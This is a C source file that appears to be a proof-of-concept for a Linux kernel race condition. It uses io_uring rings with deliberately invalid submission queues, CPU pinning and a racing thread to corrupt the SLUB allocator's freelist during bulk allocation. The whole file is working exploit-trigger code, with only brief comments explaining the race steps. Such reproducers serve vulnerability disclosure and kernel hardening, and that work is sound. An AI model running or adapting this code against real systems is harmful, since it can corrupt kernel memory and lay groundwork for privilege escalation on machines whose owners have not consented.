/*$ gcc -o slub_bulk slub_bulk.c -Wall -pthread*/
#define _GNU_SOURCE
#include <pthread.h>
#include <err.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <linux/io_uring.h>

static int io_uring_setup(int entries, struct io_uring_params *params) {
  return syscall(425, entries, params);
}
static int io_uring_enter(int fd, int to_submit, int min_complete, int flags, void *sig, size_t sigsz) {
 return syscall(426, fd, to_submit, min_complete, flags, sig, sigsz);
}
static void pin_to(int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &cset))
    return;
}

static int ring1, ring2;
static struct io_uring_params params1, params2;
static unsigned char *sqmap1, *sqmap2;

static void *thread_fn(void *dummy) {
  // on ring2, do single request first, get preempted in free fastpath
  if (prctl(PR_SET_NAME, "RACE1")) return NULL;
  io_uring_enter(ring2, 1, 0, 0, NULL, 0);

  // then on ring2, consume broken freelist before the other thread's
  // alloc slowpath clobbers it.
  // this allocates the single allocation from above as well as the two allocations
  // that the other thread already grabbed in the bulk alloc fastpath.
  if (prctl(PR_SET_NAME, "RACE3")) return NULL;
  io_uring_enter(ring2, 3, 0, 0, NULL, 0);
  return NULL;
}

int main(void) {
  pin_to(0);

  // create two uring instances (implies 2 fallback context allocations).
  // give both bogus sqrings so that we don't actually go through the entire
  // request submission logic.
  ring1 = io_uring_setup(8, &params1);
  if (ring1 == -1) return -1;
  sqmap1 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring1, IORING_OFF_SQ_RING);
  if (sqmap1 == MAP_FAILED) return -1;
  ((int*)(sqmap1 + params1.sq_off.array))[0] = 0xffff; /* invalid */
  (*(int*)(sqmap1 + params1.sq_off.tail)) += 8;

  ring2 = io_uring_setup(8, &params2);
  if (ring2 == -1) return -1;
  sqmap2 = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, ring2, IORING_OFF_SQ_RING);
  if (sqmap2 == MAP_FAILED) return -1;
  ((int*)(sqmap2 + params2.sq_off.array))[0] = 0xffff; /* invalid */
  (*(int*)(sqmap2 + params2.sq_off.tail)) += 8;

  // create 11 more contexts (fallback contexts, for simplicity)
  for (int i=0; i<11; i++) {
    struct io_uring_params dummy_params = {};
    int dummy_ring = io_uring_setup(1, &dummy_params);
    if (dummy_ring == -1) return -1;
  }

  pthread_t thread;
  if (pthread_create(&thread, NULL, thread_fn, NULL))
    return -1;

  usleep(500000);

  // on ring1, do 3 requests (2 immediate, 1 via preempted slowpath)
  if (prctl(PR_SET_NAME, "RACE2")) return -1;
  io_uring_enter(ring1, 3, 0, 0, NULL, 0);
}
